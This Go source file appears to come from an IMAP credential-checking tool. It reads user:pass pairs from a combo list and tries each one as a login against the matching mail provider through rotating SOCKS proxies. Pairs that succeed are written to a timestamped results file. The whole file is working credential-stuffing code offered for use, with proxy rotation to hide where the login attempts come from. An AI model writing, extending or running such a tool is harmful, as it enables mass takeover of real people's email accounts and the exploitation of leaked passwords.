package main

import (
	"bufio"
	"fmt"
	"log"
	"math/rand"
	"os"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	"golang.org/x/net/context"

	"github.com/pierelucas/atlantr-extreme/imap"
	"github.com/pierelucas/atlantr-extreme/parse"
	"github.com/pierelucas/atlantr-extreme/utils"
)

// WorkerStateMachine --
func WorkerStateMachine(ctx context.Context, smobj *sm, startCH <-chan struct{}, wg *sync.WaitGroup) {
	defer wg.Done()

	<-startCH // Wait till the main routine is ready

	// initalize a new imaper struct
	imaper := imap.NewImap(matcherData, conf.GetUSESOCKS(), conf.GetPROCESSMAILS())

	for {
		select {
		case <-ctx.Done(): // return when the context is closed
			return
		case j, ok := <-smobj.jobCH:
			// We return when jobs is a empty struct or a closed channel
			if !ok {
				return
			}

			// Now we check if the host exists in our HostData
			// when not send it trough the notFoundCH back to writer function
			hostToGet := strings.Split(j.User, "@")[1]
			hoster, ok := hosterData[hostToGet]
			if !ok {
				log.Printf("%s not found", hostToGet)
				smobj.notFoundCH <- j
				continue
			}

			// Got the fulladdres of the host
			addr := hoster.GetFullAddr()

			// Read proxies from channel, timeout when the channel is empty (closed) or blocking.
			// TODO: We have to find a better solution for this problem than a timeout
			var socksAddr string
			if conf.GetUSESOCKS() {
				select {
				case proxie := <-smobj.validProxies.proxies:
					socksAddr = fmt.Sprintf("%s:%s", proxie.URL, strconv.Itoa(proxie.Port))
				case <-time.After(time.Millisecond):
					socksAddr = func() string {
						rand.Seed(time.Now().UnixNano())
						return smobj.validProxies.validSocks[rand.Intn(smobj.validProxies.len-1)]
					}()
				}
			}

			// Now we call the IMAP Handler
			valid, err := imaper.IMAPutil(socksAddr, addr, j.User, j.Pass)
			if err != nil {
				log.Printf("%v : %s\n", err, j.User)
				continue
			}

			// When the result is valid, send the job in the resultCH channel to the writer function
			switch valid {
			case true:
				log.Printf("Valid: %s\n", j.User)
				smobj.resultCH <- j
			default:
				log.Printf("Invalid: %s\n", j.User)
			}

			// Chill down
			// TODO: Maybe we will delete this later
			time.Sleep(time.Millisecond)
		}
	}
}

// Producer --
func Producer(ctx context.Context, smobj *sm, path string, startLine int, startCH <-chan struct{}) {
	<-startCH // Wait till the main routine is ready

	f, err := os.Open(path)
	utils.CheckErrorFatal(err)
	defer f.Close()

	scanner := bufio.NewScanner(f)
	lCount := 0
	for scanner.Scan() {
		lCount++
		if lCount < startLine {
			continue
		}

		l := strings.TrimSpace(scanner.Text())

		select {
		case <-ctx.Done():
			return
		default:
			user, pass, err := parse.UserPass(l)
			if err != nil {
				log.Print(err)
				continue
			}

			smobj.jobCH <- &Job{User: user, Pass: pass, lCount: lCount}
			atomic.AddUint64(&lastline, 1) // add lastline
		}
	}
	close(smobj.jobCH)
}

// Writer --
func Writer(ctx context.Context, result <-chan *Job, fileNameCH chan<- string, bufferSize int, path string, startCH <-chan struct{}) {
	<-startCH // Wait till the main routine is ready

	var lineBreak string

	// got linebreak on differrent architectures
	switch runtime.GOOS {
	case "windows":
		lineBreak = "\r\n"
	default:
		lineBreak = "\n"
	}

	// We need a better filename
	t := time.Now()
	filename := fmt.Sprintf("%s_%s.txt", path, t.Format("2006-01-02-15:04.05"))

	// Store the new filename in our non-blocking channel
	fileNameCH <- filename

	f, err := os.OpenFile(filename, os.O_CREATE|os.O_WRONLY, 0644)
	utils.CheckErrorFatal(err)
	defer f.Close()

	bufferedWriter := bufio.NewWriter(f)
	if bufferSize > 4096 {
		bufferedWriter = bufio.NewWriterSize(
			bufferedWriter,
			bufferSize,
		)
	}

	// We define a function for flushing the memory to disk
	writeOut := func() {
		err = bufferedWriter.Flush()
		utils.CheckError(err)
	}

	for {
		select {
		case <-ctx.Done():
			writeOut() // write memory buffer to disk
			return
		case j, ok := <-result:
			if !ok {
				writeOut() // write memory buffer to disk
				return
			}

			// write to buffer
			_, err = bufferedWriter.WriteString(
				j.User + ":" + j.Pass + lineBreak,
			)
			utils.CheckError(err)
		}
	}
}
